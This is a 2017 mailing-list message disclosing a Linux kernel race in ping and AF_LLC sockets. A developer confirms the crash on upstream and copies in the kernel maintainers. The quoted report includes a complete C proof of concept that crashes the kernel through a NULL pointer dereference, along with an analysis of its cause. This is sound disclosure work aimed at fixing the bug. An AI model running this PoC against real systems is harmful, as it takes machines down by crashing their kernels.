From: Andrey Konovalov <andreyknvl@google.com>
Subject: Re: [oss-security] Linux kernel ping socket / AF_LLC connect()
 sin_family race
Date: Fri, 24 Mar 2017 21:43:30 +0100
Message-ID: <CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>
References: <20170324202714.GA29241@openwall.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: Vasily Kulikov <segoon@openwall.com>
To: oss-security@lists.openwall.com,
        "David S. Miller" <davem@davemloft.net>,
        Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>,
        James Morris <jmorris@namei.org>,
        Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>,
        Patrick McHardy <kaber@trash.net>,
        netdev <netdev@vger.kernel.org>,
        LKML <linux-kernel@vger.kernel.org>,
        Eric Dumazet <edumazet@google.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-pg0-f45.google.com ([74.125.83.45]:36090 "EHLO
        mail-pg0-f45.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S966632AbdCXUnc (ORCPT
        <rfc822;netdev@vger.kernel.org>); Fri, 24 Mar 2017 16:43:32 -0400
Received: by mail-pg0-f45.google.com with SMTP id g2so621774pge.3
        for <netdev@vger.kernel.org>; Fri, 24 Mar 2017 13:43:31 -0700 (PDT)
In-Reply-To: <20170324202714.GA29241@openwall.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

On Fri, Mar 24, 2017 at 9:27 PM, Solar Designer <solar@openwall.com> wrote:
> Hi,
>
> I haven't fully investigated this issue, and the Subject is provisional
> (but will probably get stuck).  I am not yet sure which kernel
> subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
> there might be other ways to trigger the issue.

Reproduced the crash on current upstream
(ebe64824e9de4b3ab3bd3928312b4b2bc57b4b7e).

Adding kernel maintainers.

>
> Just off Twitter:
>
> https://twitter.com/danieljiang0415/status/845116665184497664
>
> daniel_jiang
> @danieljiang0415
> google won't fix kernel crash bug, I release the poc now.
> https://github.com/danieljiang0415/android_kernel_crash_poc
>
> And the PoC is:
>
> ---
> #include <stdio.h>
> #include <sys/socket.h>
> #include <arpa/inet.h>
> #include <stdlib.h>
> static int sockfd = 0;
> static struct sockaddr_in addr = {0};
>
> void fuzz(void * param){
>     while(1){
>         addr.sin_family = 0;//rand()%42;
>         printf("sin_family1 = %08lx\n", addr.sin_family);
>         connect(sockfd, (struct sockaddr *)&addr, 16);
>     }
> }
> int main(int argc, char **argv)
> {
>     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
>     int thrd;
>     pthread_create(&thrd, NULL, fuzz, NULL);
>     while(1){
>         addr.sin_family = 0x1a;//rand()%42;
>         addr.sin_port = 0;
>         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
>         connect(sockfd, (struct sockaddr *)&addr, 16);
>         addr.sin_family = 0;
>     }
>     return 0;
> }
> ---
>
> I suppose the focus on Android is because it makes ping sockets
> available to users by default, but the bug isn't Android-specific.
>
> By granting ping sockets to a user, I am able to crash a RHEL7'ish
> system with the above PoC quickly.  The crash (at least in my two tests)
> is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
> In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
> ping_unhash() since it's shared with IPv6, but is otherwise similar.
>
> The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
> For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
> then proceeds to overwrite parts of the "struct sockaddr".
> llc_ui_bind() looks similar, so the issue might also be triggerable via
> bind().  These overwrites might be directly related to the crash, or it
> might be something further.  At first glance, these two functions look
> similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
> trigger the issue on latest upstream as well.
>
> At this point, I think I'll leave further investigation to someone more
> up-to-date on these interfaces and conventions.  I am merely conveying
> the message, which at this point I understand only partially.
>
> Alexander
